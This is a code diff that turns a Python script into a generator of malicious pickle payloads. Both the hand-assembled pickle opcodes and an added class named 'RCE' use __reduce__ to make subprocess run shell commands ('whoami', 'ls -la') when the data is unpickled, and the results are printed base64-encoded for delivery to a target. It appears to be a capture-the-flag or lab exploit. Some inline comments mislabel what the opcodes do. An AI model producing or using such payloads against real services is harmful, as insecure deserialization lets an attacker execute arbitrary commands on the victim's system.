@@ -1,6 +1,6 @@
-import pickle
+import base64
 
-pickle.loads(
+d = (
     b'\x80\x05' # PROTO 5
     b'c__main__\n__builtins__.getattr\n\x940' # load and memoize getattr at 0 and pop
     b'c__main__\n__builtins__\n\x940' # load and memoize __builtins__ as 1 and pop
@@ -14,12 +14,30 @@ pickle.loads(
         b'h\x00' # load getattr
         b'(' # MARK
             b'h\x02' # load __import__
-            b'Vgc\n' # "gc" literal
-            b'o' # import `gc`
-        b'Vget_referents\n' # "get_referrers" literal
-        b'o' # retrieve `gc.get_referrers`
+            b'Vsubprocess\n' # "subprocess" literal
+            b'o' # import `subprocess`
+        b'Vcall\n' # "system" literal
+        b'o' # retrieve `os.system`
     b'\x94' # memoize as 3
-    b'((h\x00h\x01Vglobals\nooVframe\n((h\x00(h\x02Vsys\noV_getframe\noos'
-    b'((h\x00h\x01Vbreakpoint\noo'
+    b'h\x03'
+    b'Vwhoami\n'
+    b'o'
     b'.' #STOP
 )
+
+print(base64.b64encode(d))
+
+import pickle
+import base64
+import subprocess
+
+
+class RCE:
+    def __reduce__(self):
+        cmd = 'ls -la'
+        return subprocess.check_output, (cmd.split(' '),)
+
+
+if __name__ == '__main__':
+    pickled = pickle.dumps(RCE())
+    print(base64.urlsafe_b64encode(pickled))
